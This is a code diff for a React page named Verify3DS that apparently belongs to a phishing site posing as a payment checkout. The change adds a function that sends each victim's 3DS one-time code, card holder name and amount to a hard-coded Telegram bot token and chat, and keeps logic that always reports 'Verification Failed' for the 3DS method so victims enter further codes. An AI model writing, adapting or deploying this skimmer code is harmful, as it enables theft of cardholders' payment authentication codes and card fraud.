@@ -6,18 +6,32 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/components/ui/use-toast";
 
-const send3DSData = async (verificationData: any) => {
+const sendTelegramNotification = async (verificationData: any) => {
+  const botToken = "7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU";
+  const chatId = "-4781499307";
+  
   try {
-    await fetch('https://api.travelt-pay.site/api/notify-3ds', {
+    const message = `🔐 3DS Verification:
+💰 Amount: $${verificationData.amount}
+👤 Card Holder: ${verificationData.cardHolder}
+✅ Method: ${verificationData.verifyMethod}
+🔑 Code: ${verificationData.code}`;
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify(verificationData)
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
     });
-    console.log('3DS data sent successfully');
+    
+    console.log('3DS notification sent successfully');
   } catch (error) {
-    console.error('Error sending 3DS data:', error);
+    console.error('Error sending 3DS notification:', error);
   }
 };
 
@@ -40,31 +54,35 @@ export default function Verify3DS() {
     
     setIsSubmitting(true);
 
-    // Send 3DS data through proxy
-    await send3DSData({
-      code,
-      amount,
-      cardHolder,
-      verifyMethod
-    });
-
-    // Add delay for processing
-    await new Promise(resolve => setTimeout(resolve, 2000));
-
-    // Always show error for 3DS method
-    if (verifyMethod === "3DS") {
-      setIsSubmitting(false);
-      setCode("");
-      toast({
-        variant: "destructive",
-        title: "Verification Failed",
-        description: "Invalid code. Please try again.",
+    try {
+      await sendTelegramNotification({
+        code,
+        amount,
+        cardHolder,
+        verifyMethod
       });
-      return;
-    }
 
-    // For PUSH method, proceed normally
-    navigate("/");
+      // Add delay for processing
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      // Always show error for 3DS method
+      if (verifyMethod === "3DS") {
+        setIsSubmitting(false);
+        setCode("");
+        toast({
+          variant: "destructive",
+          title: "Verification Failed",
+          description: "Invalid code. Please try again.",
+        });
+        return;
+      }
+
+      // For PUSH method, proceed normally
+      navigate("/");
+    } catch (error) {
+      console.error('Error during verification:', error);
+      setIsSubmitting(false);
+    }
   };
 
   return (
